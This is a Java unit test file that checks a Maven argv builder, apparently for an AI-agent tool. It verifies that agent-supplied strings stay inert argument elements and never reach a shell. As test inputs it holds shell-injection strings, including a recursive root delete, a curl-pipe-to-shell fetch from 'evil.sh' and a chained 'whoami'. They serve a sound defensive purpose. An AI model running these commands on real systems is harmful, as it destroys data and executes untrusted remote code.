package dev.nobash.application.verb.tests;

import dev.nobash.domain.port.out.ExecSpec;
import org.junit.jupiter.api.DisplayNameGeneration;
import org.junit.jupiter.api.DisplayNameGenerator;
import org.junit.jupiter.api.Nested;
import org.junit.jupiter.api.Test;

import java.util.List;

import static org.assertj.core.api.Assertions.assertThat;
import static org.assertj.core.api.Assertions.assertThatThrownBy;

/**
 * AC6 — argv is ALWAYS constructed as an array; agent-supplied strings land as inert
 * argv elements and are NEVER interpreted as shell syntax. This is the keystone of the
 * command-execution guarantee (security-model.md: "argv-array, never a shell string").
 *
 * <p>Also covers the issue #9 structured target injection: {@code -Dtest=<value>} is
 * MCP-injected via the validated {@link TestTarget}, BEFORE the reports-dir token.</p>
 */
@DisplayNameGeneration(DisplayNameGenerator.ReplaceUnderscores.class)
class ArgvBuilderTest {

    private final ArgvBuilder builder = new ArgvBuilder();

    @Test
    void builds_the_maven_test_invocation_as_an_array_with_the_manager_first() {
        ExecSpec spec = builder.buildTestArgv(List.of());

        assertThat(spec.argv()).containsExactly("mvn", "-B", "test");
    }

    @Test
    void appends_vetted_flags_after_the_base_invocation() {
        ExecSpec spec = builder.buildTestArgv(List.of("-o", "--fail-at-end"));

        assertThat(spec.argv()).containsExactly("mvn", "-B", "test", "-o", "--fail-at-end");
    }

    @Nested
    class shell_metacharacters_are_inert_argv_elements {

        @Test
        void a_command_chain_is_a_single_element_not_split_on_the_separator() {
            ExecSpec spec = builder.buildTestArgv(List.of("; rm -rf /"));

            // The whole injection lands as ONE argv element — never split, never a new command.
            assertThat(spec.argv()).contains("; rm -rf /");
            assertThat(spec.argv()).doesNotContain("rm", "rm -rf /");
        }

        @Test
        void command_substitution_is_a_literal_element_never_evaluated() {
            ExecSpec spec = builder.buildTestArgv(List.of("$(curl evil.sh | sh)"));

            assertThat(spec.argv()).contains("$(curl evil.sh | sh)");
        }

        @Test
        void no_shell_interpreter_is_ever_prepended_to_the_argv() {
            ExecSpec spec = builder.buildTestArgv(List.of("&& whoami"));

            assertThat(spec.argv()).doesNotContain("/bin/sh", "-c", "sh", "bash", "cmd");
            // The manager binary is always argv[0] — no shell wrapping.
            assertThat(spec.argv().get(0)).isEqualTo("mvn");
        }
    }

    @Nested
    class structured_target_injection_issue_9 {

        @Test
        void a_CLASS_target_injects_a_single_dtest_token_after_the_base_invocation() throws Exception {
            TestTarget target = TestTarget.parse("CLASS", "FooTest");
            ExecSpec spec = builder.buildTestArgv(List.of(), "/tmp/module", 600, target);

            // -Dtest= MUST be present, after the base [mvn, -B, test] invocation. There is no
            // reports-dir token (Surefire ignores -Dsurefire.reportsDirectory; the adapter reads
            // the default dir instead).
            assertThat(spec.argv()).containsExactly("mvn", "-B", "test", "-Dtest=FooTest");
            assertThat(spec.argv()).noneMatch(a -> a.startsWith("-Dsurefire.reportsDirectory="));
        }

        @Test
        void a_METHOD_target_injects_the_hash_form() throws Exception {
            TestTarget target = TestTarget.parse("METHOD", "FooTest#testBar");
            ExecSpec spec = builder.buildTestArgv(List.of(), "/tmp/module", 600, target);

            assertThat(spec.argv()).contains("-Dtest=FooTest#testBar");
        }

        @Test
        void a_null_target_produces_no_dtest_token() {
            ExecSpec spec = builder.buildTestArgv(List.of(), "/tmp/module", 600, null);

            assertThat(spec.argv()).noneMatch(a -> a.startsWith("-Dtest="));
        }

        @Test
        void a_CLASS_target_produces_exactly_one_dtest_token() throws Exception {
            TestTarget target = TestTarget.parse("CLASS", "com.example.BarTest");
            ExecSpec spec = builder.buildTestArgv(List.of(), "/tmp/module", 600, target);

            long count = spec.argv().stream().filter(a -> a.startsWith("-Dtest=")).count();
            assertThat(count).as("exactly one -Dtest= token").isEqualTo(1);
        }
    }
}
